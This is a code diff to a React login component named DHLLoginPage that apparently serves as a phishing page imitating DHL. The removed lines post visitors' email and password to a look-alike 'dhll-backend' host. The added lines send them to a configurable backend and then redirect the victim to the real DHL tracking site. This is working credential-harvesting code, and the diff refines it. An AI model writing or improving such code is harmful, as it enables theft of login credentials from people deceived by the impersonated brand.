@@ -24,33 +24,39 @@ const DHLLoginPage = () => {
   ];
 
   // ✅ Handle login
-  const handleLogin = async () => {
-    if (!email || !password) return alert("Email and password are required");
-    setIsLoading(true);
+ const handleLogin = async () => {
+  if (!email || !password) return alert("Email and password required");
+  setIsLoading(true);
 
-    try {
-      const response = await fetch("https://dhll-backend.onrender.com/login", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ email, password }),
-});
+  try {
+    const response = await fetch(`${API_BASE_URL}/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password }),
+    });
 
-
-      const data = await response.json();
-
-      if (data.success) {
-        // Redirect to DHL tracking page
-        window.location.href = "https://www.dhlsameday.com/SkyTracking/";
-      } else {
-        alert(`❌ ${data.message}`);
-      }
-    } catch (error) {
-      console.error("Login error:", error);
-      alert("Server error. Please try again later.");
-    } finally {
-      setIsLoading(false);
+    if (!response.ok) {
+      const text = await response.text();
+      console.error("Server error:", response.status, text);
+      alert(`❌ Login failed: ${response.status}`);
+      return;
     }
-  };
+
+    const data = await response.json();
+
+    if (data.success) {
+      window.location.href = "https://www.dhlsameday.com/SkyTracking/";
+    } else {
+      alert(`❌ ${data.message}`);
+    }
+  } catch (error) {
+    console.error("Login error:", error);
+    alert("Server error. Please try again later.");
+  } finally {
+    setIsLoading(false);
+  }
+};
+
 
   // ✅ Submit on Enter key
   const handleKeyPress = (e) => {
